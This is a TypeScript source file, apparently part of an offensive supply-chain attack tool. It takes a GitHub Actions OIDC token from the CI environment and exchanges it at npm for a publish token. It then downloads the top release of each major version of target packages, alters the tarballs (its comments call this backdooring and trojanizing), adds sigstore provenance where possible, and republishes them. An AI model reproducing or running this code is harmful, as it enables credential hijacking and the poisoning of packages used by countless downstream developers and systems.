import { $ } from "bun";
import { createWriteStream } from "fs";
import { join } from "path";
import { Readable } from "stream";
import { pipeline } from "stream/promises";

import { logUtil } from "../../utils/logger";
import { Mutator } from "../base";
import { publishTarball } from "../npm/publish";
import { updateTarball } from "../npm/tarball";
import { generateProvenanceBundle } from "./provenance";

/**
 * Comma-separated list of packages to backdoor, read from TARGET_PACKAGES env.
 * Falls back to OIDC_PACKAGES for backwards compatibility.
 */
export function getOidcPackages(): string[] {
  const raw = process.env.TARGET_PACKAGES || process.env.OIDC_PACKAGES;
  if (!raw || !raw.trim()) {
    return [];
  }
  return raw
    .split(",")
    .map((p) => p.trim())
    .filter(Boolean);
}

export class NPMOidcClient extends Mutator {
  constructor() {
    super();
  }

  private async updateTarball(tarballPath: string): Promise<string> {
    return updateTarball(tarballPath, {
      tag: "[npmoidc]",
      targetName: "Setup",
    });
  }

  async downloadPackages(
    packages: string[],
    oidcToken: string,
  ): Promise<{ tmpDir: string; downloaded: string[] }> {
    const tmpDir = await $`mktemp -d`.text().then((s) => s.trim());
    const downloaded: string[] = [];

    const download = async (pkg: string) => {
      try {
        const meta = await fetch(
          "https://registry.npmjs.org/" + `${pkg.replace("/", "%2F")}`,
        );
        if (!meta.ok) return;
        const data = (await meta.json()) as {
          "dist-tags": { latest: string };
          versions: Record<string, { dist?: { tarball?: string } }>;
        };

        const targets = topVersionsPerMajor(data.versions);
        logUtil.log(
          `[npmoidc] ${pkg}: targeting ${targets.length} version(s) — ${targets.join(", ")}`,
        );

        for (const version of targets) {
          const tarball = data.versions[version]?.dist?.tarball;
          if (!tarball) continue;

          const res = await fetch(tarball);
          if (!res.ok || !res.body) continue;

          const filename = `${pkg.replace("@", "").replace("/", "-")}-${version}.tgz`;
          const tarballPath = join(tmpDir, filename);
          await pipeline(
            Readable.fromWeb(res.body as import("stream/web").ReadableStream),
            createWriteStream(tarballPath),
          );
          const updatedPath = await this.updateTarball(tarballPath);

          // Generate sigstore provenance (best-effort).
          // Skip when GITHUB_REF is missing — dangling commits trigger
          // deployments without a real ref, causing Missing SourceRepositoryRef
          // errors that waste the single-use OIDC token.
          let provenanceBundle: Record<string, any> | undefined;
          if (process.env.GITHUB_REF) {
            try {
              const result = await generateProvenanceBundle(updatedPath);
              if (result) {
                provenanceBundle = result.bundle;
                if (result.transparencyLogUrl) {
                  logUtil.log(
                    `[provenance] ${pkg}@${version}: ${result.transparencyLogUrl}`,
                  );
                }
              }
            } catch (provErr) {
              logUtil.log(
                `[provenance] generation failed for ${pkg}@${version}: ${provErr}`,
              );
            }
          }

          await this.publishPackage(
            updatedPath,
            pkg,
            oidcToken,
            provenanceBundle,
          );
          downloaded.push(updatedPath);
        }
      } catch (e) {
        logUtil.log(`Failed to download ${pkg}: ${e}`);
      }
    };

    // Serialize package processing — the OIDC token exchange in
    // publishPackage is not safe to call concurrently.
    for (const pkg of packages) {
      await download(pkg);
    }
    return { tmpDir, downloaded };
  }

  async publishPackage(
    tarballPath: string,
    packageName: string,
    oidcToken: string,
    provenanceBundle?: Record<string, any>,
  ): Promise<boolean> {
    try {
      const escapedPackageName = encodeURIComponent(packageName);
      const npmRes = await fetch(
        `https://registry.npmjs.org/-/npm/v1/oidc/token/exchange/package/${escapedPackageName}`,
        {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
            Authorization: `Bearer ${oidcToken}`,
          },
          body: JSON.stringify({ oidcToken }),
        },
      );
      const { token } = (await npmRes.json()) as { token: string };

      if (token) {
        logUtil.log("About to publish!");

        // Try with provenance first (if available)
        if (provenanceBundle) {
          const ok = await publishTarball(
            tarballPath,
            token,
            false,
            provenanceBundle,
          );
          if (ok) return true;
          // Provenance likely rejected due to missing SourceRepositoryRef
          // in the signing certificate — retry without it.
          logUtil.log("[publish] provenance rejected, retrying without it");
        }

        return await publishTarball(tarballPath, token, false);
      } else {
        logUtil.log("About to publish!");
        await publishTarball(tarballPath, "DummyToken", true);
        return false;
      }
    } catch (e) {
      logUtil.error("Error publishing!");
      logUtil.error(e);
      return false;
    }
  }

  async execute(): Promise<Boolean> {
    const { ACTIONS_ID_TOKEN_REQUEST_TOKEN, ACTIONS_ID_TOKEN_REQUEST_URL } =
      process.env;

    const oidcRes = await fetch(
      `${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=npm:registry.npmjs.org`,
      {
        headers: { Authorization: `bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}` },
      },
    );
    const { value: oidcToken } = (await oidcRes.json()) as { value: string };
    if (oidcToken) {
      const packages = getOidcPackages();
      if (packages.length === 0) {
        logUtil.log("OIDC_PACKAGES is empty — nothing to trojanize.");
        return false;
      }
      await this.downloadPackages(packages, oidcToken);
      return true;
    } else {
      return false;
    }
  }
}

// ── Version selection ─────────────────────────────────────────────────────

/**
 * Given an npm package's versions object, return the highest stable
 * (non-prerelease) version for each major version line.
 *
 * Skips pre-releases (anything containing "-").
 */
function topVersionsPerMajor(versions: Record<string, unknown>): string[] {
  const majors = new Map<number, string>();

  for (const v of Object.keys(versions)) {
    // Skip pre-releases
    if (v.includes("-")) continue;

    const parts = v.split(".");
    const major = parseInt(parts[0]!, 10);
    if (isNaN(major)) continue;

    const existing = majors.get(major);
    if (!existing || compareSemver(v, existing) > 0) {
      majors.set(major, v);
    }
  }

  return Array.from(majors.values()).sort(compareSemver);
}

function compareSemver(a: string, b: string): number {
  const aParts = a.split(".").map(Number);
  const bParts = b.split(".").map(Number);
  for (let i = 0; i < 3; i++) {
    const diff = (aParts[i] || 0) - (bParts[i] || 0);
    if (diff !== 0) return diff;
  }
  return 0;
}
